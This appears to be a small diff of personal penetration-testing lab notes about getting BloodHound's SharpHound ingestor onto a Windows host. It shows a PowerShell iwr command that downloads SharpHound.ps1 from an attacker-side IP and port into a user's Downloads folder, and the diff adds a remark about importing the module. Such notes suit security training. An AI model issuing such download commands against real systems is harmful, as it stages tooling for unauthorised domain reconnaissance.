@@ -151,5 +151,7 @@ Was able to grab the file, but bloodhound is complaining about the ingestor exe.
 iwr -uri "http://192.168.45.228:8888/SharpHound.ps1" -outfile "C:\Users\joe\Downloads\sharp.ps1"
 ```
 
+Now to mess with the import-module 
+
 
 
